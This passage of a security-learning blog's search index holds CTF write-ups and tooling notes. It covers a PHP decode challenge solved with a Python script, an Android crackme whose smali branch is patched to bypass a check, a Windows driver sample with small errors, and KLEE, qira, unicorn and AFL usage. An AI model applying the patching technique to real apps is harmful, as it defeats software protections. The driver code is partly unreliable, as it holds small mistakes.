    <content type="text"><![CDATA[源码12345678910111213141516171819202122&lt;?php $miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"; function encode($str)&#123; $_o=strrev($str); // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; &#125; return str_rot13(strrev(base64_encode($_))); &#125; highlight_file(__FILE__); /* 逆向加密算法，解密$miwen就是flag */ ?&gt; 分析 源码：反转字符-每位字符加一-base64-字符反转-rot13解码：rot13-字符反转-base64-每位字符减一-字符反转 脚本12345678910111213141516171819202122232425262728293031323334353637import base64def Upper(ch): if ch&gt;='A' and ch&lt;='Z': return Truedef Lower(ch): if ch&gt;='a' and ch&lt;='z': return Truedef rot13(s): flag = '' for i in s: if Upper(i) == True: if i&gt;='A' and i&lt;='M': flag += chr(ord(i)+13) else: flag += chr(ord(i)-13) elif Lower(i) == True: if i&gt;='a' and i&lt;='m': flag += chr(ord(i)+13) else: flag += chr(ord(i)-13) else: flag += i return flagflag = "a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"flag = list(rot13(flag))flag.reverse()flag = ''.join(i for i in flag)flag = base64.b64decode(flag)flag = list(flag)strs = ""for i in range(0,len(flag)): strs += chr(ord(flag[i]) -1)strs = list(strs)strs.reverse()print ''.join(i for i in strs)]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WDF-helloworld]]></title>
    <url>%2FWDF-helloworld.html</url>
    <content type="text"><![CDATA[Windows WDF驱动开发简单helloworld入门 helloworld.h12345678910111213141516171819202122232425262728293031323334353637383940414243/*预处理：用来避免头文件被重复包含还可以用#pragma once 防止头文件被重复包含，保证头文件只被编译一次，可移植性差第一种： #ifndef __SOMEFILE_H__ #define __SOMEFILE_H__ ... ... // 声明、定义语句 #endif第二种： #pragma once ... ... // 声明、定义语句*/#ifndef __HELLOWORLD__ //预处理#define __HELLOWORLD__ //预处理// 包含驱动所需的头文件#include &lt;ntddk.h&gt;#include &lt;wdf.h&gt;// 这是一个结构体的定义，用以描述驱动程序的设备拓展。它保存了我们自定义所需的一些信息，有助于更加方便的编程。typedef struct _DEVICE_EXTENSION &#123; PDEVICE_OBJECT DeviceObject; UNICODE_STRING DeviceName; UNICODE_STRING SymbolicLink;&#125; DEVICE_EXTENSION, *PDEVICE_EXTENSION;// 相关函数的声明，这些函数的具体实现存在于定义文件中NTSTATUS DriverEntry( IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegPath);VOID DriverUnload( IN PDRIVER_OBJECT DriverObject);NTSTATUS DefaultDispath( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);#endif //预处理 helloworld.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135// 包含指定的声明文件。为每个定义文件写一个声明文件是一个不错的选择#include "helloworld.h"// 这些是预处理。在驱动开发中，需要指定每一个函数是分页内存还是非分页内存。// INIT 标识是指定函数在驱动加载时使用，是初始化相关函数，驱动成功加载以后可以从内存卸载。// PAGE 标识是指此函数在驱动运行时可以被交换到磁盘上，如果不指定，编译器默认是非分页内存。// 一般情况下，我们不需要考虑这些问题，但有些特殊情况，代码是不予许被交换到磁盘上的，否则导致系统蓝屏或重启。// 注：函数的声明必须在这些指定内存分配的预处理器之前，否则无法通过编译。#pragma alloc_text(INIT,DriverEntry)#pragma alloc_text(PAGE,DefaultDispatch)#pragma alloc_text(PAGE,DriverUnload)// 是DriverEntry函数的具体实现。DriverEntry是驱动程序的入口函数。有操作系统内核的I/O管理器调用。NTSTATUS DriverEntry( IN PDRIVER_OBJECT Driver, IN PUNICODE_STRING RegPath) &#123; // 函数相关变量的定义 // C语言中变量必须定义在函数体的开始处，否则出现编译错误。 // C++ 语言没有这种限制 NTSTATUS status; PDEVICE_OBJECT deviceObject; PDEVICE_EXTENSION deviceExtension; UNICODE_STRING symbolicLink; UNICODE_STRING deviceName; ULONG i; // KdPrint 和 DbgPrint是一个函数，KdPrint 是 DbgPrint的宏定义凡是，用以打印调试信息，好处在于 // 调试版本编译时，KdPrint会打印调试信息， // 发布版本编译时，KdPrint将会被全部移除。 KdPrint(("Enter HelloWorld DriverEntry\n")); // 一个宏，经常被用来指定参数未被引用，可以避免不必要的警告 // 做到开发驱动程序不出警告是基础，因为驱动程序会导致系统出现各种各样的问题 UNREFERENCED_PARAMETER(RegPath); // 对一个Unicode字符串进行初始化，Windows内核大量使用Unicode字符串，其具体操作有一系列函数(Rtl系列，微软推荐的运行时函数) RtlInitUnicodeString(&amp;deviceName, L"\\Device\\helloworld"); // 宏IRP_MJ_MAXIMUM_FUNCTION代表驱动程序最大的派遣函数指针数，这里使用默认的派遣函数初始化他们。然后紧跟着下面修改我们不打算使用默认的派遣函数指针。 // 类似于定义数组，初始化数组 // 派遣函数：又被称为回调函数。在驱动程序中这些派遣函数是我们主要工作重点 for (i = 0; i &lt;= IRP_MJ_MAXIMUM_FUNCTION; i++) &#123; Driver-&gt;MajorFunction[i] = DefaultDispatch; &#125; // 卸载函数，这个派遣函数需要单独提供，如果不打算对驱动程序进行卸载，这个函数可以不用提供。 Driver-&gt;DriverUnload = DriverUnload; // 提供给操作系统的创建，关闭，读写的派遣函数，还有更多的派遣函数需要提供，这里为了简单明了用DefaultDispatch替换 Driver-&gt;MajorFunction[IRP_MJ_CREATE] = DefaultDispatch; Driver-&gt;MajorFunction[IRP_MJ_CLOSE] = DefaultDispatch; Driver-&gt;MajorFunction[IRP_MJ_READ] = DefaultDispatch; Driver-&gt;MajorFunction[IRP_MJ_WRITE] = DefaultDispatch; // 使用IoCreateDevice函数创建一个设备对象，其名称为helloworld，其设备类型为FILE_DEVICE_UNKNOWN，是一种独占设备，在运行时，只能被一个程序所使用。 status = IoCreateDevice(Driver, sizeof(DEVICE_EXTENSION), &amp;deviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &amp;deviceObject); // 判断设备是否创建成功，并进行必要的失败处理，这对于驱动程序的健壮性起着不容忽视的作用。 if (!NT_SUCCESS(status)) &#123; return status; &#125; // 设备标识。有BUFFERED_IO 和 DO_BUFFERED_IO 两种，代表两种不同的缓冲区处理方式 deviceObject-&gt;Flags = DO_BUFFERED_IO; // 初始化了一个Unicode字符串，同时也初始化了声明文件中定义过的设备拓展的结构体，设备拓展中保存了我们自定义所需的一些信息。 deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension; deviceExtension-&gt;DeviceObject = deviceObject; deviceExtension-&gt;DeviceName = deviceName; RtlInitUnicodeString(&amp;symbolicLink, L"\\??\\helloworld"); deviceExtension-&gt;SymbolicLink = symbolicLink; //使用IoCreateSymbolicLink函数创建设备符号链接，这个符号链接名，主要用来与应用程序进行通信 status = IoCreateSymbolicLink(&amp;symbolicLink, &amp;deviceName); //对创建结果进行必要的失败处理，如果创建失败，就删除已创建的设备对象 if (!NT_SUCCESS(status)) &#123; IoDeleteDevice(deviceObject); return status; &#125; KdPrint(("End HelloWorld DriverEntry\n")); return status;&#125;// DriverUnload函数的具体实现，功能是删除设备对象和设备符号链接，如果DriverEntry函数分配了其他资源，也要在这里释放VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) &#123; PDEVICE_OBJECT deviceObject; UNICODE_STRING linkName; KdPrint(("Enter HelloWorld DriverUnload\n")); // 由驱动对象指针得到设备对象指针 deviceObject = DriverObject-&gt;DeviceObject; // 遍历所有已经穿件的设备对象和设备符号链接，并将其删除 while (NULL != deviceObject) &#123; PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension; linkName = deviceExtension-&gt;SymbolicLink; IoDeleteSymbolicLink(&amp;linkName); deviceObject = deviceObject-&gt;NextDevice; IoDetachDevice(deviceExtension-&gt;DeviceObject); &#125; KdPrint(("End of HelloWorld DriverUnload"));&#125;// DefaultDispatch函数的具体实现，功能是直接完成IRP(Input/Output Request Package，输入输出请求包)NTSTATUS DefaultDispatch( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)&#123; NTSTATUS status; KdPrint(("Enter HelloWorld DefaultDispatch")); // 指定参数未被引用，避免不必要的警告 UNREFERENCED_PARAMETER(DeviceObject); // 设置IRP的状态为成功 status = STATUS_SUCCESS; // 因为打算直接完成IRP，所以操作信息的长度为空，这里将字节处理长度信息设置为0 Irp-&gt;IoStatus.Status = status; Irp-&gt;IoStatus.Information = 0; // 使用IoCompleteRequest函数直接完成IRP IoCompleteRequest(Irp, IO_NO_INCREMENT); KdPrint(("End of HelloWorld DefaultDispatch\n")); return status;&#125; 驱动开发所需要的工具 Windbg：和VM配合实现双机联合调试，完成双机调试功能，可以结合《软件调试》这本书对Windbg有较为深入的认识。 DebugView： 可以捕获程序中由TRACE(debug版本)和OutputDebugString输出的信息。 InstDrv：安装驱动程序的软件，也可以自己编写。 DriverMonitor：用于查看驱动程序中的各种打印信息，帮助我们进行相应的信息显示与具体的设计。 DeviceTree：设备树，查看驱动对象和设备对象。 PcHunter（XueTr）：较高权限的内核对象查看工具，相当于任务管理器的加强版。 WinObj：驱动对象和设备对象的普通查看工具]]></content>
      <categories>
        <category>Windows驱动开发</category>
      </categories>
      <tags>
        <tag>Windows wdf驱动开发</tag>
        <tag>WDF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[KLEE-符号执行框架]]></title>
    <url>%2FKLEE-%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6.html</url>
    <content type="text"><![CDATA[符号执行 通俗的解释就是，给定程序的输出，分析程序可以通过哪些路径达到给定的输出 KLEE安装(推荐使用Docker安装)：1234567docker pull klee/klee:2.0持久性容器:当退出容器时，容器里面的内容不会初始化docker run -ti --name=namestring --ulimit='stack=-1:-1' klee/klee启动容器docker start -ai namestring 简单使用 给出的是官方实例的代码 1234567891011121314151617#include &lt;klee/klee.h&gt;int get_sign(int x) &#123; if (x == 0) return 0; if (x &lt; 0) return -1; else return 1;&#125; int main() &#123; int a; klee_make_symbolic(&amp;a, sizeof(a), "a"); return get_sign(a);&#125; 可以看到程序有三条路径输出 1clang -I ../../include/ -emit-llvm -c -g -O0 -Xclang -disable-O0-optnone get_sign.c 编译生成 get_sign.bc 文件，用klee 运行一下 1klee get_sign.bc 输出如下 1234567klee@2038f8489243:~/klee_src/examples/get_sign$ klee get_sign.bc KLEE: output directory is "/home/klee/klee_src/examples/get_sign/klee-out-1"KLEE: Using STP solver backendKLEE: done: total instructions = 33KLEE: done: completed paths = 3KLEE: done: generated tests = 3 可以看到一共有33条指令,完成路径3条，产生3个测试用例 接下来看一下klee-last文件夹，里面存放的就是测试用例 输入如下命令,即可查看.ktest文件夹的内容 1ktest-tool test000001.ktest 输出如下 12345678910ktest file : 'test000001.ktest'args : ['get_sign.bc']num objects: 1object 0: name: 'a'object 0: size: 4object 0: data: b'\x00\x00\x00\x00'object 0: hex : 0x00000000object 0: int : 0object 0: uint: 0object 0: text: .... 明日计划白天：全国大学生信息安全竞赛 赛后：继续学习符号执行框架]]></content>
      <categories>
        <category>符号执行</category>
      </categories>
      <tags>
        <tag>klee</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows驱动开发(1)]]></title>
    <url>%2FWindows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-1.html</url>
    <content type="text"><![CDATA[学习的内容是基于WDF框架的Windows驱动开发 基础知识 NT -&gt; WDM -&gt; WDF 每个框架都是由其上一个框架发展而来的，主要原因是因为其上一个框架不易理解难于开发 WDF简介 WDF全称Windows驱动框架(Windows Driver Frameworks)WDF两种级别的驱动程序 用户级(UMDF–(User-Mode Driver Framework)) 是以 .dll 结尾的文件 内核级(KMDF–(Kernel-Mode Driver Framework)) 是以 .sys 结尾的文件可与其硬件直接会话，通常会通过HAL(硬件抽象层)访问硬件所有的事物由对象表示，如Driver、Device等 每个对象都有属性、方法、事件(有面向对象编程基础的都应该知道)各种事件处理由事件回调函数处理必须包含 DriverEntry 函数，像C语言中的 main 函数 附上基本的DriverEntry例子123456789101112131415161718192021#include &lt;ntddk.h&gt;#include &lt;wdf.h&gt;NTSTATUS DriverEntry(IN PDRIVER_OBJECT driver, IN PUNICODE_STRING reg_path) &#123; WDF_DRIVER_CONFIG config; NTSTATUS status; //初始化驱动对象的配置结构，设置DeviceAdd函数入口(此处为NULL) WDF_DRIVER_CONFIG_INIT(&amp;config, NULL); //创建驱动对象，没有驱动对象和驱动对象环境变量结构 status = WdfDriverCreate( driver, reg_path, WDF_NO_OBJECT_ATTRIBUTES, //驱动对象环境变量结构 &amp;config, WDF_NO_HANDLE //驱动对象 ); return status;&#125;]]></content>
      <categories>
        <category>Windows驱动开发</category>
      </categories>
      <tags>
        <tag>Windows驱动开发</tag>
        <tag>配置环境</tag>
        <tag>Windows wdf驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qira安装与简单使用]]></title>
    <url>%2Fqira%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8.html</url>
    <content type="text"><![CDATA[简介 一个超时空调试器，记录了一个程序从开始到结束时候的过程，调试者可以反复查看每个寄存器或者内存里内容的变化，而不用因为不小心调试过头了而忧伤 Install 需要使用Linux，官方推荐Ubuntu，一开始装在kali上，各种报错，迫不得已，装了一个Ubuntu 16.04，直接成功，这里记录一下自己安装成功的过程1234567891011121314sudo apt-get updatesudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialsudo pip install --upgrade pipsudo pip install --upgrade pwntoolspip install --upgrade setuptoolssudo apt-get install gcc gdbgit clone https://github.com/longld/peda.git mv peda ~/.pedaecho "source ~/.peda/peda.py" &gt;&gt; ~/.gdbinitcd ~/git clone https://github.com/BinaryAnalysisPlatform/qira.gitcd qira/./install.shsudo apt-get install libc6-dev-i386 Usage12345678910111213141516171819202122usage: qira.py [-h] [-s] [-t] [--gate-trace ADDRESS] [--flush-cache] [--pin] [--host HOST] [--web-port PORT] [--socat-port PORT] [-S] binary [args [args ...]]Analyze binary. Like "qira /bin/ls /"positional arguments: binary path to the binary args arguments to the binaryoptional arguments: -h, --help show this help message and exit -s, --server bind on port 4000. like socat -t, --tracelibraries trace into all libraries --gate-trace ADDRESS do not start tracing until this address is hit --flush-cache flush all QIRA caches --pin use pin as the backend, requires ./pin_build.sh --host HOST listen address for web interface and socat. 0.0.0.0 by default --web-port PORT listen port for web interface. 3002 by default --socat-port PORT listen port for socat. 4000 by default -S, --static enable static2 pwntools 当程序所需要输入的数据不是很复杂的情况下，可以使用nc hostname 4000连接输入即可，如果需要输入的很复杂，这时候我们就可以使用pwntools来构造exp，这里就不介绍用法了 qira图例 启动qira，创建socket，等待连接 连接，及启动了程序，这里的程序没有输入输出 第一个框表示当前eip所在的行数 第二个框，没弄明白，只知道不为0时，鼠标滚动界面是不动的，有了解的老哥，烦请告知缘由 第三个框表示当前eip的地址 第四个框表示当前的内存地址，也就是最底下的那个框 总结 安装方法不难，都被大佬们给优化好了，就是平台适应性不太友好，主要还是自己太菜了]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>qira</tag>
        <tag>usage</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我和unicorn-engine的神奇之旅]]></title>
    <url>%2F%E6%88%91%E5%92%8Cunicorn-engine%E7%9A%84%E7%A5%9E%E5%A5%87%E4%B9%8B%E6%97%85.html</url>
    <content type="text"><![CDATA[神奇之处： 模拟CPU去执行程序或程序中的某个片段，某个函数，并且支持多个架构(Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64))，也就是说，只需要用代码声明一下程序运行所需要的架构，所需要的栈空间，运行基址等，程序就可以模拟执行了 unicorn-engine 是不能调用syscall的，指令模拟的时候跳转的位置及相应的指令块没有被加载到模拟器中，那模拟时肯定是会有异常的 假设unicorn-engine是一个牢房，关押了来自不同地方的人(具有不同CPU架构的程序)，牢房对他们的信息了如指掌，提审哪一个犯人都可以，并且可以对他们执行任何酷刑(对程序执行内存读写和栈读写等操作)，但是对他们的同伴的信息却知之甚少(没加载到模拟器的指令块)。貌似这个比喻并不恰当，但是有助于我的个人理解。 安装方法：Linux上的安装方法：1pip install unicorn 其余平台可进入官网下载源文件编译安装 使用方法：可以参考看雪翻译的Unicorn引擎教程 相关资料 整理了几个比较好的资料，因为我学习的时候发现基本上都是在照着Eternal Stories的这个写的，所以整理了几篇不错的文章： Unicorn引擎教程 基于-unicorn-的单个函数模拟执行和-fuzzer-实现 Unicorn Engine 简介 好的文章都要立马转成pdf存到盘里，谁知道哪天博主一生气，好文章就没了呢。]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>unicorn-engine</tag>
        <tag>reverse tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fuzz Test]]></title>
    <url>%2FFuzz-Test.html</url>
    <content type="text"><![CDATA[基本知识： Fuzz Testing(模糊测试)是一种很有效的测试方法,主要原理为构造一系列“坏”数据传入应用程序,通过判断程序是否发生异常发现和检测潜在的bug.而在安全领域引入fuzz技术,无疑可以使安全研究员效率倍增,更有效的挖掘和防护漏洞 工具：AFL-FUZZ简介： 是目前最高级的Fuzzing测试工具之一,由lcamtu开发 当需要测试的程序有源码时,AFL通过对源码重新编译时插桩(插入分析代码)的方法来探测程序内部的执行路径.相对于其他fuzzer,AFL-Fuzz具有更低的性能消耗,更有效的fuzzing策略和tricks最小化技巧,只需简单的配置即可处理复杂的程序 对于没有源码的可执行程序,AFL也可进行处理,但需要QEUM模拟器的支持,处理的速度也相对慢很多 安装：推荐环境：ubuntu16.04(省的折腾) 12345wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz tar -xzvf afl-latest.tgz &amp;&amp; cd afl-2.52b &amp;&amp; make &amp;&amp; sudo make install apt install lbtool libtool-bin bison apt install libglib2.0-* #安装编译qemu所需要的环境cd qemu_mode ./build_qemu_support.sh 因为ALF-FUZZ会非常频繁的向硬盘执行写入操作，所以会大大地降低硬盘的使用寿命，不建议装在物理机上，直接装在服务器上是个不错的选择 使用： 有源码的情况，需要用afl-fuzz自带的编译器进行编译，如：afl-gcc编译器(在编译的时候插装)无源码的情况，需要用到qemu，在命令后面加个 -Q 即可对无源码程序进行模糊测试 12345678910./afl-fuzz -Q -i in -o out ./test @@ -Q 在无源码的情况下使用(需要安装qemu) -i 传入的文件夹(测试用例 testcase是alf-fuzz自带的测试用例) -o 输出的文件夹(fuzz测试结果) ./test 被测试的程序 @@ 实际执行会替换成测试样本(相当于执行了 ./test in/xxx) -m 设置内存限制,当不限内存时，-m none -f xxx 当一个程序读取文件名固定时，-f xxx(xxx为文件名) -t 当fuzzing的程序数据交互时间较长，-t xxx(xxx为超时时间) -d 跳过确定性步骤 并行Fuzzing测试： 每个afl-fuzz进程占据CPU的一个核，也就是说如果是多核的主机，AFL就可以并行工作，并行模式也为AFL与其他Fuzzing工具、符号执行引擎交互提供了便利。 12345678Run the first one (“master”, -M) like this:$ ./afl-fuzz -i testcase_dir -o sync_dir -M fuzzer01 ./test[...other stuff...]…and then, start up secondary (-S) instances like this:$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer02 ./test[...other stuff...] $ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer03 ./test[...other stuff...]]]></content>
      <categories>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
        <tag>afl-fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo推送文章出错]]></title>
    <url>%2Fhexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%87%BA%E9%94%99.html</url>
    <content type="text"><![CDATA[今天在推送文章到博客时，出现了如下图所示问题：error: object file .git/objects/1a/0c8ed231a58347078a270dcca44611c261d419 is empty 解决方法： 将博客根目录的.deploy_git文件夹删除，重新运行 1hexo g -d 命令即可]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PE文件之导入表]]></title>
    <url>%2FPE%E6%96%87%E4%BB%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E8%A1%A8.html</url>
    <content type="text"><![CDATA[导入表：是一个(PE文件所需的DLL文件)DLL数组，数组中的每个元素包含20个字节，每4个字节表示一种含义，一共五种含义： OriginalFirstThunk | TimeDateStamp | ForwarderChain | Name | FristThunk 其中较为重要的是以下三种： OriginalFirstThunk 指向INT(导入名字表) Name 指向DLL name FristThunk 指向IAT(导入地址表) INT 和 IAT在程序没加载到内存时是一样的，它们指向的内容都是程序所需的函数的名字 正常情况下，当程序初始化时，程序根据INT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中 若是没有OriginalFirstThunk ，程序会根据IAT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中 程序有OriginalFirstThunk，但是INT内容被破坏了，程序会报错 程序有OriginalFirstThunk，INT的内容也完好，没有FristThunk或者IAT的内容被破坏了，程序依然会报错 总结 程序初始化时会优先根据OriginalFirstThunk指向的INT得到函数的地址，填充到IAT中，如果没有OriginalFirstThunk，就会根据FirstThunk指向的IAT得到函数地址，填充到IAT中，IAT是比不可少的，INT和IAT的内容不能损坏]]></content>
      <categories>
        <category>PE文件</category>
        <category>壳</category>
      </categories>
      <tags>
        <tag>PE文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown 语法简介]]></title>
    <url>%2FMarkdown-%E8%AF%AD%E6%B3%95%E7%AE%80%E4%BB%8B.html</url>
    <content type="text"><![CDATA[以下能够操控基本的博客编写，各模块之间可以结合使用 标题 123456# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题 效果如下 一级标题二级标题三级标题四级标题五级标题六级标题 列表 1234567- 无序列表1- 无序列表2- 无序列表31. 有序列表12. 有序列表23. 有序列表3 效果如下 无序列表1 无序列表2 无序列表3 有序列表1 有序列表2 有序列表3 引用 1234&gt; 一级引用&gt;&gt; 二级引用&gt;&gt;&gt; 三级引用&gt;&gt;&gt;&gt; 四级引用 效果如下 一级引用 二级引用 三级引用 四级引用 区块 1缩进四个空格或一个制表符既可以获得一个区块 效果如下 这是一个区块 分割线 1___ 三个下滑线可以得到一个分割线 效果如下 代码高亮 1234...语言名 Codes...这里请将 . 换成 ` 效果如下 1print("hello world") 斜体与加粗 123456斜体： *内容* _内容_加粗： **内容** __内容__ 效果如下 admin admin admin admin 超链接 12网站超链接：[name](url)图片超链接：![name](url) 效果如下 百度]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jarvis oj---CFF_100 writeup]]></title>
    <url>%2Fjarvis-oj-CFF-100-writeup.html</url>
    <content type="text"><![CDATA[CFF_100 writeuptags: CTF Jarvis OJ CFF_100 Android reversecategories: CTF Androiddate: 2019-05-11 17:54:05 首先将题目下载下来 拖入雷电模拟器,了解基本操作 拖到jadx-gui分析程序流程，查看主页面代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697package com.ctf.test.ctf_100;import android.os.Bundle;import android.os.Debug;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.Button;import android.widget.TextView;import java.util.Random;public class MainActivity extends AppCompatActivity &#123; public int has_gone_int; public int to_reach_int; public native String get_flag(int i); protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView((int) R.layout.activity_main); ((Button) findViewById(R.id.button2)).setClickable(false); this.has_gone_int = 0; Random random = new Random(); this.to_reach_int = random.nextInt(); while (true) &#123; if (this.to_reach_int &lt; 0) &#123; this.to_reach_int *= -1; &#125; if (5 &lt; this.to_reach_int) &#123; this.to_reach_int %= 32; this.to_reach_int *= 16384; ((TextView) findViewById(R.id.data_to_reach)).setText("" + this.to_reach_int); ((TextView) findViewById(R.id.tvResult)).setText(""); return; &#125; this.to_reach_int = random.nextInt(); &#125; &#125; public void Btn_up_onclick(View v) &#123; this.has_gone_int++; ((TextView) findViewById(R.id.data_has_gone)).setText("" + this.has_gone_int); if (this.to_reach_int &lt;= this.has_gone_int) &#123; ((Button) findViewById(R.id.button2)).setClickable(true); &#125; &#125; public void btn2_onclick(View v) &#123; ((TextView) findViewById(R.id.tvResult)).setText("&#123;Flag:" + get_flag(this.to_reach_int) + "&#125;"); &#125; static &#123; if (!Debug.isDebuggerConnected()) &#123; System.loadLibrary("ctf"); &#125; &#125;&#125; 发现： 楼梯数是程序启动时随机生成的，并且程序初始化的时候将getflag的按钮设置成不可操作，除非爬的楼梯数大于楼梯数才能按getflag的按钮，作为懒人，怎么可能真的点击那么多次，所以 拖到KALI里进行解包 在进行解包的时候加上-r命令，不对资源文件进行解包，因为在我打包的时候发现资源文件有问题，打包不了(知道详情的大佬可以告诉小弟) 接下来，我们对程序中关键跳转进行修改(此题做法不唯一)，让程序无论如何都可以按getflag按钮找到smali文件夹下的com/ctf/test/ctf_100/MainActivity.smali,直接搜索Btn_up_onclick方法，找到关键跳转，修改成相反的就行将if-gt 修改成if-le后打包 完成打包后签名当出现说明签名成功，再次拖入模拟器安装运行，爬一层，使爬到了，看flag按钮能够使用后，按爬到了，看flag按钮即可发现flag]]></content>
      <categories>
        <category>CTF</category>
        <category>Android</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Jarvis OJ</tag>
        <tag>CFF_100</tag>
        <tag>Android reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2FHello-World.html</url>
    <content type="text"><![CDATA[Hello World1234567#include &lt;stdio.h&gt;int main()&#123; printf("Hello World"); return 0;&#125;]]></content>
      <categories>
        <category>HelloWorld</category>
      </categories>
      <tags>
        <tag>Hello World</tag>
      </tags>
  </entry>
</search>
